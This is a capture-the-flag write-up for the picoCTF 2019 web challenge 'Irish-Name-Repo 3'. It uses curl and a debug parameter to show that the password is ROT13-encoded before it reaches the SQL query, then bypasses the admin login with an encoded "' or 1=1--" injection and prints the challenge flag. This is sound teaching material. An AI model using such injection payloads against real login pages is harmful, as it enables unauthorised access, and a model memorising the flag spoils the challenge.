# Irish-Name-Repo 3
Web Exploitation, 400 points

## Description:
> There is a secure website running at http://2019shell1.picoctf.com:12271. Try to see if you can login as admin!


## Solution: 


The website offered an admin login page:

```html
<form action="login.php" method="POST">
    <fieldset>
        <div class="form-group">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" class="form-control">
        </div>
        <div class="form-group">
            <label for="password">Password:</label>
            <div class="controls">
                <input type="password" id="password" name="password" class="form-control">
            </div>
        </div>
        <input type="hidden" name="debug" value="0">

        <div class="form-actions">
            <input type="submit" value="Login" class="btn btn-primary">
        </div>
    </fieldset>
</form>
```

The solution from the [Irish-Name-Repo_1](Irish-Name-Repo_1.md) and [Irish-Name-Repo_2](Irish-Name-Repo_2.md) didn't work anymore.

Using the debug interface, we can inspect the SQL query:

```console
root@kali:/media/sf_CTFs/pico/Irish-Name-Repo_3# curl "https://2019shell1.picoctf.com/problem/12271/login.php" --data "password=test&debug=1"
<pre>password: test
SQL query: SELECT * FROM admin where password = 'grfg'
</pre><h1>Login failed.</h1>
```

It looks like the password was somehow encrypted. Given the fact that `t` was replaced with `g` twice, this might be a substitution cipher.

Let's try a simple injection:
```console
root@kali:/media/sf_CTFs/pico/Irish-Name-Repo_3# curl "https://2019shell1.picoctf.com/problem/12271/login.php" --data "password=' or 1=1--&debug=1"
<pre>password: ' or 1=1--
SQL query: SELECT * FROM admin where password = '' be 1=1--'
</pre>
```

Now let's try again, sending `be` instead of `or`:
```console
root@kali:/media/sf_CTFs/pico/Irish-Name-Repo_3# curl "https://2019shell1.picoctf.com/problem/12271/login.php" --data "password=' be 1=1--&debug=1" && echo
<pre>password: ' be 1=1--
SQL query: SELECT * FROM admin where password = '' or 1=1--'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_ef7eac2f}</p>
```


